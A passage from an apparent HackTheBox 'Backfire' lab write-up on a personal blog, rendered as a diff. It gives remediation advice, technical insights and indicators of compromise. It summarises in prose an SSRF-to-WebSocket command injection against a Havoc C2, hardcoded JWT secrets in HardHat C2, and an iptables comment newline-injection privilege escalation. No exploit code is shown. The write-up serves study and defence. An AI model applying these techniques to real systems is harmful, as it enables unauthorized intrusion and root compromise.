+<li>Disable SSRF-prone endpoints</li>
+<li>Enforce WebSocket TLS encryption</li>
+</ul>
+</li>
+<li><strong>HardHat C2 Remediation</strong>:
+<ul>
+<li>Rotate JWT secrets</li>
+<li>Implement dynamic secret generation</li>
+</ul>
+</li>
+<li><strong>System Hardening</strong>:
+<ul>
+<li>Restrict iptables-save permissions</li>
+<li>Implement filesystem integrity monitoring</li>
+</ul>
+</li>
+</ol>
+<hr>
+
+<h2 class="relative group">10. Technical Insights
+    <div id="10-technical-insights" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#10-technical-insights" aria-label="Anchor">#</a>
+    </span>
+    
+</h2>
+<p><strong>WebSocket Protocol Abuse</strong>:</p>
+<ul>
+<li>SSRF bypasses network isolation through HTTP-to-WebSocket protocol switching</li>
+<li>Frame manipulation enables C2 command injection</li>
+</ul>
+<p><strong>JWT Security Antipattern</strong>:</p>
+<ul>
+<li>Hardcoded secrets enable trivial privilege escalation</li>
+<li>Lack of token invalidation mechanisms</li>
+</ul>
+<p><strong>Linux Privilege Escalation</strong>:</p>
+<ul>
+<li>iptables comment field allows newline injection</li>
+<li>iptables-save writes raw rules including metadata</li>
+</ul>
+<hr>
+
+<h2 class="relative group">11. Indicators of Compromise
+    <div id="11-indicators-of-compromise" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#11-indicators-of-compromise" aria-label="Anchor">#</a>
+    </span>
+    
+</h2>
+<p><strong>Network</strong>:</p>
+<ul>
+<li>Outbound connections to <code>backfire.htb:40056</code></li>
+<li>WebSocket handshakes with missing TLS</li>
+</ul>
+<p><strong>Filesystem</strong>:</p>
+<ul>
+<li>Unauthorized <code>/root/.ssh/authorized_keys</code> modifications</li>
+<li><code>/tmp/websocket_payloads</code> directory creation</li>
+</ul>
+<p><strong>Process</strong>:</p>
+<ul>
+<li>Unusual gcc compilation processes from Havoc</li>
+<li>iptables ruleset changes via non-root users</li>
+</ul>
+
+          
+          
+          
+        </div>
+        
+        
+
+        
+
+        
+
+      </div>
+    </section>
+
+    
+    <footer class="pt-8 max-w-prose print:hidden">
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600">
+      <div class="flex justify-between pt-3">
+        <span class="flex flex-col">
+          
+            <a
+              class="flex text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+              href="/posts/2025-07-03-hackthebox-mirai/">
+              <span class="leading-6">
+                <span class="inline-block rtl:rotate-180">&larr;</span>&ensp;Mirai – Technical Report
+              </span>
+            </a>
+            
+              <span class="ms-6 mt-1 text-xs text-neutral-500 dark:text-neutral-400">
+                <time datetime="2017-10-03T00:00:00&#43;00:00">3 October 2017</time>
+              </span>
+            
+          
+        </span>
+        <span class="flex flex-col items-end">
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+    </footer>
+  </article>
+
+        
+
+
+  
+
+
+
+
+
+
+<div
+  id="scroll-to-top"
+  class="fixed bottom-6 end-6 z-50 transform translate-y-4 opacity-0 duration-200">
+  <a
+    href="#the-top"
+    class="pointer-events-auto flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="Scroll to top"
+    title="Scroll to top">
+    &uarr;
+  </a>
+</div>
+
+      </main><footer id="site-footer" class="py-10 print:hidden">
+  
+  
+  <div class="flex items-center justify-between">
+    
+    
+      <p class="text-sm text-neutral-500 dark:text-neutral-400">
+          &copy;
+          2026
+          s0lkr
+      </p>
+    
+
+    
+    
+  </div>
+  
+    <script>
+      mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+        margin: 24,
+        background: "rgba(0,0,0,0.5)",
+        scrollOffset: 0,
+      });
+    </script>
+  
+  
+  
+    <div id="particles-js"></div>
+<script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+<script>
+  particlesJS("particles-js", {
+    "particles": {
+      "number": { "value": 100, "density": { "enable": true, "value_area": 800 } },
+      "color": { "value": "#00ffcc" },
+      "shape": { "type": "circle" },
+      "opacity": { "value": 0.5, "random": true },
+      "size": { "value": 3, "random": true },
+      "line_linked": { "enable": true, "distance": 150, "color": "#00ffcc", "opacity": 0.3, "width": 1 },
+      "move": { "enable": true, "speed": 2, "direction": "none", "random": false, "straight": false, "out_mode": "out", "bounce": false }
+    },
+    "interactivity": {
+      "detect_on": "canvas",
+      "events": { "onhover": { "enable": true, "mode": "repulse" }, "onclick": { "enable": true, "mode": "push" } }
+    },
+    "retina_detect": true
+  });
+</script>
+  
+</footer>
+<div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500"
+  data-url="http://localhost:1313/">
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800">
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0">
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span>
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+    </div>
+  </body>
+  
+</html>
